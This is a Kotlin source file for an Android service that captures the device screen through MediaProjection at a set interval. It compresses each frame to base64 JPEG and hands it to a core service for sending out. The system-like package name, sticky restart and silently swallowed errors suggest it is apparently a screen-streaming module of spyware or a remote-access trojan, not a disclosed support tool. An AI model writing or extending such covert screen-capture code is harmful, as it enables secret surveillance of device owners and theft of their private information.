package com.system.service.monitors

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import com.system.service.core.CoreService
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean

class ScreenStreamService : Service() {

    companion object {
        var isRunning = false
        // SetupActivity se resultCode + data store karo
        var projectionResultCode: Int = 0
        var projectionResultData: Intent? = null
    }

    private val streaming = AtomicBoolean(false)
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var intervalMs: Long = 1000L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }

        if (projectionResultData == null) {
            stopSelf(); return START_NOT_STICKY
        }
        intervalMs = intent?.getLongExtra("interval", 1000L) ?: 1000L
        isRunning = true
        streaming.set(true)
        startProjection()
        return START_STICKY
    }

    private fun startProjection() {
        thread = HandlerThread("ScreenStream").apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(projectionResultCode, projectionResultData!!)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        wm.defaultDisplay.getMetrics(metrics)

        // Scale down for bandwidth
        val width  = metrics.widthPixels  / 2
        val height = metrics.heightPixels / 2
        val dpi    = metrics.densityDpi   / 2

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection!!.createVirtualDisplay(
            "screen_capture", width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, handler)

        scheduleCapture(width, height)
    }

    private fun scheduleCapture(w: Int, h: Int) {
        if (!streaming.get()) return
        handler?.post {
            try {
                val img: Image = imageReader?.acquireLatestImage() ?: run {
                    handler?.postDelayed({ scheduleCapture(w, h) }, intervalMs)
                    return@post
                }
                val plane = img.planes[0]
                val rowStride = plane.rowStride
                val pixelStride = plane.pixelStride
                val buf = plane.buffer
                val bmp = Bitmap.createBitmap(
                    rowStride / pixelStride, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buf)
                val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                img.close()

                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                CoreService.instance?.sendData("screen_frame", JSONObject().apply {
                    put("frame", b64)
                    put("w", w); put("h", h)
                })
            } catch (_: Exception) {}
            handler?.postDelayed({ scheduleCapture(w, h) }, intervalMs)
        }
    }

    private fun stopStream() {
        streaming.set(false); isRunning = false
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
        thread?.quitSafely()
    }

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
